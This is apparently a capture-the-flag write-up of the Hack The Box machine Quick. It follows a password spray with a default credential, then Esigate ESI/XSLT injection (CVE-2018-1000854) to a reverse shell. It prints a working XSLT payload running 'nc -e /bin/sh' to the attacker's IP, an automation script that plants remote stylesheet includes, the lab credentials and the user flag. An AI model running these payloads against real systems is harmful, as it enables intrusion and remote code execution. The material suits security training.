---
description: >-
  Zweilosec's write-up on the hard difficulty Linux machine Quick from
  https://hackthebox.eu
---

# HTB - Quick

## Overview

![](../../.gitbook/assets/0-quick-infocard.png)

Short description to include any strange things to be dealt with

## Useful Skills and Tools

### Connecting to HTTPS through UDP \(QUIC protocol\)

* quiche \[link\]
* experimental curl features \[link\]
* can also change settings in-browser experimental settings \[link\]
* 
### Upgrading a limited shell to a full TTY

1. Determine the installed version of python with `which python`.
2. Spawn a Bash shell through python's PTY with `python -c 'import pty;pty.spawn("/bin/bash")'`.
3. Hit CTRL+Z to background the shell.
4. Type `stty raw -echo` to enable all input to be sent raw through your reverse shell.
5. Type `fg` to return your shell to the foreground.
6. Enable screen clearing and colors with `export TERM=xterm-256color`

### Creating an SSH tunnel for port forwarding

* -L flag
* link
* example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.186`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.

```text
zweilos@kalimaa:~$ nmap -p- -sC -sV -oN quick.nmap 10.10.10.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 14:35 EDT
Nmap scan report for 10.10.10.186
Host is up (0.055s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                            
|_http-title: Quick | Broadband Services                                                                
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .          
Nmap done: 1 IP address (1 host up) scanned in 131.16 seconds
```

Based on my Nmap scan of TCP ports, there were only two open: SSH on the default port 22 and an Apache website being served over HTTP on the non-standard port 9001.

I opened a browser to see that was hosted on HTTP, and got a website which appeared to belong to a business selling broadband internet.  

![](../../.gitbook/assets/1-quick.png)

There was also a list of currently subscribed clients at `/clients.php`.  

![](../../.gitbook/assets/4-clients.png)

The main site says "Upto 17MBps - £18 \| Upto 50MBps - £27" and because the price is in pounds it indicates that this might be a UK service provider.  Correlating the countries of the clients, the company names,  and the names on the Testimonials section gave me a potential list of users.  I also noted that only two clients \(Tim from Qconsulting and Elisa from Wink\) were from the UK and rated them as higher priority targets for potential access.

```text
Tim (Qconsulting Pvt Ltd) - UK

Roy (DarkWng Solutions) - US

Elisa (Wink Media) - UK

James (LazyCoop Pvt Ltd) - China
```

My shortlist of potential usernames had four entries on it. 

![](../../.gitbook/assets/2-login.png)

Clicking on the "Get Started" link led to a login page at [http://10.10.10.186:9001/login.php](http://10.10.10.186:9001/login.php). I attempted to see if any of these names would give me a positive error indicating a valid username, but the form required email addresses rather than usernames so it yielded nothing.

![](../../.gitbook/assets/6-dirbuster-quick%20%281%29.png)

According to my dirbuster scan there was an exposed `db.php`, though I was not sure how to interact with it.  Navigating to that site only brought up a blank page.

![](../../.gitbook/assets/3-portal.png)

On the main page, there was a link to `portal.quick.htb`, which I added to my `hosts` file.  It seemed to be an exact copy of the first page, except for the link that led to `portal.quick.htb` was an HTTPS site that did not connect.  

I did notice something interesting while viewing the requests in Burp though: there was an HTTP header that said `X-Powered-By: Esigate`.  Some research revealed that this was a webapp integration backend for the site.  My research also found that there were some vulnerabilities that could be exploited in this software, though they required an exposed form where specifically crafted requests could bypass security controls.  Unfortunately I didn't have anywhere to test for this vulnerability yet. [http://www.esigate.org/security/security-01.html](http://www.esigate.org/security/security-01.html) [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)

![](../../.gitbook/assets/5-server-status.png)

I also noted that the apache `server-status` page was accessible, which could lead to a serious data disclosure vulnerability.  I found some exploit code to take advantage of this at [https://github.com/mazen160/server-status\_PWN](https://github.com/mazen160/server-status_PWN), but this site didn't seem to have any data exposed that could help me.

## Nmap redux

Unfortunately this next part was spoiled for me a bit by someone mentioning that TCP was the only protocol that Nmap scanned by default and further enumeration was required.  This was enough of a clue for my to try a UDP scan to see if there were any more ports open.  

{% hint style="info" %}
UDP scans take much, much longer to complete due to the way enumeration has to be done.  Potential open UDP ports are determined by not receiving a response back from a probe, as opposed to TCP where a TCP - ACK is generally indicative of an open port, and a RST means the port is closed.  UDP does not use flags in the same way as TCP, and relies on ICMP port unreachable messages to relay closed ports. 

I recommend not scanning all 65536 ports at a time if you ever need to scan UDP, and do it in chunks.  This scan also requires root privileges to run.
{% endhint %}

```text
root@kali:/home/zweilos/htb/quick# nmap --reason -sU -Pn -A -p1-1000 -oN quick.nmap-udp 10.10.10.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 18:51 EDT

Nmap scan report for quick.htb (10.10.10.186)
Host is up, received user-set (0.052s latency).
Scanned at 2020-08-10 18:51:59 EDT for 1348s
Not shown: 999 closed ports
Reason: 999 port-unreaches
PORT    STATE         SERVICE REASON      VERSION
443/udp open|filtered https   no-response
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=8/10%OT=%CT=%CU=1%PV=Y%DS=2%DC=T%G=N%TM=5F31D4D3%P=x86_64-pc-linux-gnu)
SEQ(CI=Z%II=I)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 979/udp)
HOP RTT      ADDRESS
1   76.04 ms 10.10.14.1
2   76.30 ms quick.htb (10.10.10.186)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1348.02 seconds
           Raw packets sent: 1444 (43.230KB) | Rcvd: 1157 (70.616KB)
```

There was one UDP port that seemed to be open.  Next I did some research on HTTPS over UDP port 443 and found some articles on the new protocol HTTP/3.  I remember reading about the new HTTPS protocol over UDP which used a protocol called QUIC, but I didn't expect it to already by implemented in a Hack the Box challenge \(kudos to MrR3boot!\). 

Resources:

*  [https://daniel.haxx.se/http3-explained/](https://daniel.haxx.se/http3-explained/)
*  [https://ec.haxx.se/http/http-http3](https://ec.haxx.se/http/http-http3). 
*  [https://github.com/curl/curl/wiki/QUIC-implementation](https://github.com/curl/curl/wiki/QUIC-implementation)
*  [https://quicwg.org/](https://quicwg.org/)

The QUIC protocol is used in HTTP/3 and utilizes UDP for a fast connectionless "session".  Since most websites are simple requests and responses, UDP works fine, because the extra overhead from TCP just slows everything down. Supposedly QUIC will be much faster \(pun intended?\).

This explains why the `portal.quick.htb` site had a link to an https:// site that didn't work, since the browser expects TCP:443, and most browsers do not currently support the new protocol which uses UDP. I did some looking around to see if any browsers did have support, and found [https://caniuse.com/\#feat=http3](https://caniuse.com/#feat=http3).  It seems that some browers such as Google Chrome \(or Chromium\) can enable quic in the experimental settings page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 

![](../../.gitbook/assets/7-quic.png)

It seems that some browsers such as Google Chrome \(or Chromium\) can enable QUIC in the experimental settings page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 

## Building an HTTP/3 version of cURL

While reading up on HTTP/3 and determining if a site supports it or not I found the site [https://geekflare.com/http3-test/](https://geekflare.com/http3-test/).  It mentioned a version of cURL that can be built from source that supports this protocol, so I downloaded the code from the GitHub repository at [https://github.com/curl/curl/blob/master/docs/HTTP3.md\#quiche-version](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version) and followed the instructions.

```text
quiche version
build
Build quiche and BoringSSL:

 % git clone --recursive https://github.com/cloudflare/quiche
 % cd quiche
 % cargo build --release --features pkg-config-meta,qlog
 % mkdir deps/boringssl/src/lib
 % ln -vnf $(find target/release -name libcrypto.a -o -name libssl.a) deps/boringssl/src/lib/
Build curl:

 % cd ..
 % git clone https://github.com/curl/curl
 % cd curl
 % ./buildconf
 % ./configure LDFLAGS="-Wl,-rpath,$PWD/../quiche/target/release" --with-ssl=$PWD/../quiche/deps/boringssl/src --with-quiche=$PWD/../quiche/target/release --enable-alt-svc
 % make
Run
Use HTTP/3 directly:

curl --http3 https://nghttp2.org:8443/
Upgrade via Alt-Svc:

curl --alt-svc altsvc.cache https://quic.aiortc.org/
```

[https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize](https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize)

After installing the Rust language \(and many other dependencies\) I had a shiny new experimental version of curl to play with that had HTTP/3 support. 

{% hint style="info" %}
_Since I didn't want to just live in the install directory I created an alias of **`curl3`** to the new curl with **`alias curl3=</install_path/>curl`**_
{% endhint %}

```markup
zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<head>
<style>
...snipped CSS...
</style>
</head>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>
```

With this new tool I was able to download the page at [https://portal.quick.htb](https://portal.quick.htb). There were four pages listed: `index.php`, `contact`, `about`, and `docs`.  

```markup
zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=contact
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
...snipped CSS...
</style>
</head>
<body>
<h1>Quick | Contact</h1>

<div class="container">
  <form action="/">
    <label for="fname">First Name</label>
    <input type="text" id="fname" name="firstname" placeholder="Your name..">

    <label for="lname">Last Name</label>
    <input type="text" id="lname" name="lastname" placeholder="Your last name..">

    <label for="country">Country</label>
    <select id="country" name="country">
      <option value="australia">Australia</option>
      <option value="canada">Canada</option>
      <option value="usa">USA</option>
    </select>

    <label for="subject">Subject</label>
    <textarea id="subject" name="subject" placeholder="Write something.." style="height:200px"></textarea>

    <input type="submit" value="Submit">
  </form>
</div>

</body>
</html>
```

The `/contact` page looked like a work in progress and had no useful information.

```markup
zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=about
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
...snipped CSS...
</style>
</head>
<body>

<div class="about-section">
  <h1>Quick | About Us </h1>
</div>

<h2 style="text-align:center">Our Team</h2>
<div class="row">
  <div class="column">
    <div class="card">
      <img src="/w3images/team1.jpg" alt="Jane" style="width:100%">
      <div class="container">
        <h2>Jane Doe</h2>
        <p class="title">CEO & Founder</p>
        <p>Quick Broadband services established in 2012 by Jane.</p>
        <p>jane@quick.htb</p>
      </div>
    </div>
  </div>

  <div class="column">
    <div class="card">
      <img src="/w3images/team2.jpg" alt="Mike" style="width:100%">
      <div class="container">
        <h2>Mike Ross</h2>
        <p class="title">Sales Manager</p>
        <p>Manages the sales and services.</p>
        <p>mike@quick.htb</p>
      </div>
    </div>
  </div>

  <div class="column">
    <div class="card">
      <img src="/w3images/team3.jpg" alt="John" style="width:100%">
      <div class="container">
        <h2>John Doe</h2>
        <p class="title">Web Designer</p>
        <p>Front end developer.</p>
        <p>john@quick.htb</p>
      </div>
    </div>
  </div>
</div>

</body>
</html>
```

The `/about` page contained three potential users and useful email addresses: Jane Doe `jane@quick.htb`, Mike Ross `mike@quick.htb`, and John Doe `john@quick.htb`.  

```markup
zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=docs
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">

<h1>Quick | References</h1>
<ul>
  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>
  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>
</ul>
</head>
</html>
```

The `/docs` page contained references to two PDF files. I downloaded them to see if I could find more juicy information.

```text
zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/QuickStart.pdf --output quickstart.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  228k  100  228k    0     0   668k      0 --:--:-- --:--:-- --:--:--  666k
zweilos@kalimaa:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/Connectivity.pdf --output connectivity.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 83830  100 83830    0     0   258k      0 --:--:-- --:--:-- --:--:--  257k
```

Both PDFs downloaded with no issues using the new cURL tool. The document `Connectivity.pdf` contained some interesting information!

![](../../.gitbook/assets/8-password-pdf.png)

Apparently this broadband provider gives their customers a default password to use to log into their accounts.  I hoped that one of the clients was lazy enough to use the same password to log into the portal, and then not change it later.  

The file `Connectivity.pdf` also had a link that led back to the first site: `http://quick.htb`, while the other document linked back to the HTTPS version. I thought that maybe this was a clue to log into the first site.

It took a little bit of guesswork to figure out how to log into the site since I couldn't see any clues that pointed to any email addresses other than the three `@quick.htb` ones. I first tried iterating through all of the names I had found while adding `@quick.htb` on the the end, but that wasn't successful. Next I decided that since they provided the company names and countries for each of the users, I could make potential email addresses out of those.

```text
zweilos@kali:~/htb/quick$ wfuzz -w users -c -X POST -u 'http://quick.htb:9001/login.php' -d 'email=FUZZ&password=Quick4cc3$$'

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************
Target: http://quick.htb:9001/login.php
Total requests: 7
===================================================================
ID           Response   Lines    Word     Chars       Payload                                
===================================================================

000000003:   200        0 L      2 W      80 Ch       "james@lazycoop.co.cn"                 
000000001:   200        0 L      2 W      80 Ch       "tim@Qconsulting.co.uk"                
000000002:   302        0 L      0 W      0 Ch        "elisa@wink.co.uk"                     
000000004:   200        0 L      2 W      80 Ch       "roy@DarkWng.com"                      
000000005:   200        0 L      2 W      80 Ch       "jane@quick.htb"                       
000000006:   200        0 L      2 W      80 Ch       "mike@quick.htb"                       
000000007:   200        0 L      2 W      80 Ch       "john@quick.htb"                       

Total time: 0.105150
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 66.57097
```

I loaded my potential email address list into wfuzz and used it to username-spray the website.  My hunch seemed to be right! That 302 HTTP response above meant I had found a successful login for `elisa@wink.co.uk`! _I'm actually surprised there was only one user that used the default password provided to log in! :P_

```http
POST /login.php HTTP/1.1
Host: quick.htb:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://quick.htb:9001/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Connection: close
Cookie: PHPSESSID=nl56u8c71du29c6v8rafi3h23k
Upgrade-Insecure-Requests: 1
DNT: 1

email=elisa%40wink.co.uk&password=Quick4cc3%24%24
```

I made sure to capture the login credentials in Burp so I could easily resend them any time I needed.

## Initial Foothold

![](../../.gitbook/assets/10-logged-in.png)

Now that I was logged into the portal, I had access to the `/home`, `/ticket`, and `/search` pages I had seen in my dirbuster output earlier. 

![](../../.gitbook/assets/12-raise-ticket.png)

The ticketing page had an entry field that gave me a ticket number when I submitted it.

![](../../.gitbook/assets/11-ticket.png)

Since I now had access to some fields that I could send input through, I decided to test out that Esigate vulnerability I had read about earlier to see if it could be exploited. It was assigned as CVE-2018-1000854. [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [https://github.com/esigate/esigate/issues/209](https://github.com/esigate/esigate/issues/209) 

```text
zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
Serving HTTP on 0.0.0.0 port 9088 ...
10.10.10.186 - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
```

I followed the instructions in the blog and crafted an XSL file, which contained specially formed XML code that would be read and executed by Esigate when reflected into an XML file.

![](../../.gitbook/assets/18-im-in.png)

I submitted the above code into the ticketing system, which caused Esigate to load the `evil.xml` file with my code from the `evil.xsl` code reflected into it as a "stylesheet". 

```markup
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
	<xsl:variable name="cmd"><![CDATA[./nc -e /bin/sh 10.10.15.57 13371]]></xsl:variable>
	<xsl:variable name="rtObj" select="rt:getRuntime()"/>
	<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
	Process: <xsl:value-of select="$process"/>
	Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

![](../../.gitbook/assets/18.5-im-in.png)

![](../../.gitbook/assets/19-ticket.png)

After some testing I found that the vulnerability indeed existed in the ticket search function!  After submitting my "ticket" to the system searching for the ticket number caused the code in the malicious XML file to be read and executed by Esigate.

```text
zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
Serving HTTP on 0.0.0.0 port 9088 ...
10.10.10.186 - - [11/Aug/2020 21:35:46] code 404, message File not found
10.10.10.186 - - [11/Aug/2020 21:35:46] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
10.10.10.186 - - [11/Aug/2020 21:47:27] code 404, message File not found
10.10.10.186 - - [11/Aug/2020 21:47:27] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
10.10.10.186 - - [11/Aug/2020 21:47:41] code 404, message File not found
10.10.10.186 - - [11/Aug/2020 21:47:41] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
10.10.10.186 - - [11/Aug/2020 21:47:47] code 404, message File not found
10.10.10.186 - - [11/Aug/2020 21:47:47] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
10.10.10.186 - - [11/Aug/2020 21:53:58] code 404, message File not found
10.10.10.186 - - [11/Aug/2020 21:53:58] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
10.10.10.186 - - [11/Aug/2020 21:59:59] "GET /test.xsl HTTP/1.1" 200 -
10.10.10.186 - - [11/Aug/2020 21:59:59] "GET /test.xml HTTP/1.1" 200 -
10.10.10.186 - - [11/Aug/2020 22:03:31] code 404, message File not found
10.10.10.186 - - [11/Aug/2020 22:03:31] "GET http://10.10.15.57:9088/test.xsl HTTP/1.1" 404 -
10.10.10.186 - - [11/Aug/2020 22:06:43] "GET /test1.xsl HTTP/1.1" 200 -
10.10.10.186 - - [11/Aug/2020 22:06:44] "GET /test1.xml HTTP/1.1" 200 -
```

After quite a bit of head-scratching and testing, I found that I could only use a specific filename once. After that it caused a 404 error for even files that definitely exist on my locally hosted python server. I wasn't sure what was going on but it must have been something the server was doing.

```text
zweilos@kali:~/htb/quick$ nc -lvnp 13371 > passwd
listening on [any] 13371 ...
connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 43030
```

During some of my testing, I tried to get the server to send me `/etc/passwd`, but unfortunately the file was blank. After testing it again a different way, I concluded that this command was being blocked so nothing was being sent.  The important thing was that I could see that my test exploit worked.

Next I created a python script to automate the file upload and ticket search activation process.

```python
#!/usr/bin/env python3
#coding: utf8
#Created by zweilosec (WolfZweiler) for CVE-2018-1000854 (as exposed in HTB - quick)

import requests
from bs4 import BeautifulSoup
import time
import sys

login_url = "http://quick.htb:9001/login.php"
login_data = 'email=elisa@wink.co.uk&password=Quick4cc3$$'
login_headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld', 
    'Referer': 'http://quick.htb:9001/login.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'quick.htb:9001'}
#TODO: Get headers from an initial GET request so have accurate PHPSESSID (not hard-coded)

ticket_url = "http://quick.htb:9001/ticket.php"
ticket_headers = {
    'Host': 'quick.htb:9001',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://quick.htb:9001/ticket.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld'}

esi1 = 'title=evil&msg="<esi:include src="http://10.10.15.10:1337/evil.xml" stylesheet="http://10.10.15.10:1337/evil.xsl"></esi:include>"&id=TKT-1234'
esi2 = 'title=evil1&msg="<esi:include src="http://10.10.15.10:1337/evil1.xml" stylesheet="http://10.10.15.10:1337/evil1.xsl"></esi:include>"&id=TKT-2345'
esi3 = 'title=evil2&msg="<esi:include src="http://10.10.15.10:1337/evil2.xml" stylesheet="http://10.10.15.10:1337/evil2.xsl"></esi:include>"&id=TKT-3456'

ticGet1_url = 'http://quick.htb:9001/search.php?search=1234'
ticGet2_url = 'http://quick.htb:9001/search.php?search=2345'
ticGet3_url = 'http://quick.htb:9001/search.php?search=3456'
ticGet_headers = {
    'Host': 'quick.htb:9001',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://quick.htb:9001/home.php',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'close',
    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld',
    'DNT': '1'}

esi1_r, esi2_r, esi3_r = None, None, None

login_r = requests.post(login_url, headers = login_headers, data = login_data)
#login_r.status_code should be == 302, however this login request is not working correctly
#need to further troubleshoot; for now bypassed by logging in with burp
if login_r.status_code == 200:
    print("Login successful!\n")
    esi1_r = requests.post(ticket_url, headers = ticket_headers, data = esi1)
    time.sleep(1)
    ticGet1_r = requests.get(ticGet1_url, headers = ticGet_headers)
    time.sleep(1)
else:
    print("The request failed with status code: " + str(login_r.status_code))
    print("Did not login successfully :(\n")
    print("Dumping response text:\n\n")
    print(login_r.text)
    sys.exit()

if esi1_r.status_code == 200:
    print("Evil1 upload successful!\n")
    esi2_r = requests.post(ticket_url, headers = ticket_headers, data = esi2)
    time.sleep(1)
    ticGet2_r = requests.get(ticGet2_url, headers = ticGet_headers)
    time.sleep(1)
else:
    print("The request failed with status code: " + str(esi1_r.status_code))
    print("Did not upload evil1 successfully :(\n")
    sys.exit()

if esi2_r.status_code == 200:
    print("Evil2 upload successful!\n")
    esi3_r = requests.post(ticket_url, headers = ticket_headers, data = esi3)
    time.sleep(1)
    ticGet3_r = requests.get(ticGet3_url, headers = ticGet_headers)
else:
    print("The request failed with status code: " + str(esi2_r.status_code))
    print("Did not upload evil2 successfully :(\n")
    sys.exit()

if esi3_r.status_code == 200:
    print("Evil3 upload successful!\n")
    print("Check your nc listener...shell should be inbound!\n")
else:
    print("The request failed with status code: " + str(esi3_r.status_code))
    print("Did not upload evil3 successfully :(\n")

#TODO: generalize urls and other data to be used other than in HTB; perhaps take as input arguments URL, PORT, USER, PASS, Commands to be run (foreach type loop)...
#TODO: exception handling
#TODO: instead of separate SimpleHTTPServer hosting different files, do in-script
#TODO: instead of nc listener in terminal, implement in-script
```

I ran the script with three separate ESL files.  Each were loaded with commands that would enable me to get a reverse shell.  The first send a version of `nc` that had the ability to execute commands upon connection.  The second ran `chmod +x nc` to ensure it was executable. The third contained my reverse shell command that would connect back to my machine.  I loaded up all of my files with different filenames, executed my script, and crossed my fingers hoping that everything would work.

```text
zweilos@kali:~/htb/quick$ python3 auto-evil.py 
Login successful!

Ticket submitted: code - 200
Evil1 upload successful!

Ticket submitted: code - 200
Evil2 upload successful!

Ticket submitted: code - 200
Evil3 upload successful!

Check your nc listener...shell should be inbound!
```

Everything looked like it completed without errors...

```text
zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
Serving HTTP on 0.0.0.0 port 9088 ...
10.10.10.186 - - [15/Aug/2020 12:24:41] "GET /evil.xsl HTTP/1.1" 200 -
10.10.10.186 - - [15/Aug/2020 12:24:42] "GET /evil.xml HTTP/1.1" 200 -
10.10.10.186 - - [15/Aug/2020 12:24:42] "GET /nc HTTP/1.1" 200 -
10.10.10.186 - - [15/Aug/2020 12:24:45] "GET /evil1.xsl HTTP/1.1" 200 -
10.10.10.186 - - [15/Aug/2020 12:24:45] "GET /evil1.xml HTTP/1.1" 200 -
10.10.10.186 - - [15/Aug/2020 12:24:47] "GET /evil2.xsl HTTP/1.1" 200 -
10.10.10.186 - - [15/Aug/2020 12:24:47] "GET /evil2.xml HTTP/1.1" 200 -
```

All of my files were uploaded successfully...

```text
zweilos@kalimaa:~/htb/quick$ nc -lvnp 13371
listening on [any] 13371 ...
connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 39638
whoami && hostname
sam
quick
which python                   
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
sam@quick:~$ ^Z
[1]+  Stopped                 nc -lvnp 13371
zweilos@kali:~/htb/quick$ stty raw -echo
zweilos@kali:~/htb/quick$ nc -lvnp 13371

sam@quick:~$ export TERM=xterm-256color
```

And... I was in.  I received a limited shell at my waiting listener that I quickly upgraded to a fully interactive Bash shell using python.

## User.txt

The first thing to do after gaining access was to claim my proof.

```text
sam@quick:~$ cat user.txt 
b57f59cafe91c035dc504c4d8158bd59
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `sam`

The first thing I do after gaining an account on a machine is to find out what kind of privileges are available by using `sudo -l`.  Unfortunately there was nothing I could run without the password.

```text
sam@quick:~/esigate-distribution-5.2$ ls -la
total 20
drwxr-xr-x  5 sam sam 4096 Mar 20 03:01 .
drwxr-xr-x  6 sam sam 4096 Aug 15 16:44 ..
drwxr-xr-x  3 sam sam 4096 Aug 15 16:41 apps
drwxr-xr-x  2 sam sam 4096 Oct 11  2017 lib
drwxr-xr-x 18 sam sam 4096 Oct 11  2017 src

sam@quick:~/esigate-distribution-5.2$ ls -la apps/
total 9492
drwxr-xr-x 3 sam sam    4096 Aug 15 15:33 .
drwxr-xr-x 5 sam sam    4096 Mar 20 03:01 ..
-rw-r--r-- 1 sam sam      63 Mar 20 03:01 esigate.properties
-rw-r--r-- 1 sam sam 6700842 Oct 11  2017 esigate-server.jar
-rw-r--r-- 1 sam sam 3000503 Oct 11  2017 esigate-war.war
drwxrwxr-x 3 sam sam    4096 Aug 15 15:33 work


sam@quick:~/esigate-distribution-5.2$ ls -la lib/
total 2792
drwxr-xr-x 2 sam sam   4096 Oct 11  2017 .
drwxr-xr-x 5 sam sam   4096 Mar 20 03:01 ..
-rw-r--r-- 1 sam sam 263965 Mar 10  2016 commons-codec-1.9.jar
-rw-r--r-- 1 sam sam 159509 Mar 11  2011 commons-io-2.0.1.jar
-rw-r--r-- 1 sam sam 412739 Jan 19  2016 commons-lang3-3.3.2.jar
-rw-r--r-- 1 sam sam   4981 Oct 11  2017 esigate-cas-5.2.jar
-rw-r--r-- 1 sam sam 314645 Oct 11  2017 esigate-core-5.2.jar
-rw-r--r-- 1 sam sam  24225 Oct 11  2017 esigate-servlet-5.2.jar
-rw-r--r-- 1 sam sam 295791 Oct 20  2012 htmlparser-1.4.jar
-rw-r--r-- 1 sam sam 736658 May 18  2016 httpclient-4.5.2.jar
-rw-r--r-- 1 sam sam 158984 May 18  2016 httpclient-cache-4.5.2.jar
-rw-r--r-- 1 sam sam 326724 May 18  2016 httpcore-4.4.4.jar
-rw-r--r-- 1 sam sam  16519 Sep 25  2014 jcl-over-slf4j-1.7.7.jar
-rw-r--r-- 1 sam sam  85448 Apr 24  2014 metrics-core-3.0.2.jar
-rw-r--r-- 1 sam sam  29257 Sep 11  2015 slf4j-api-1.7.7.jar

sam@quick:~/esigate-distribution-5.2$ ls -la src/
total 72
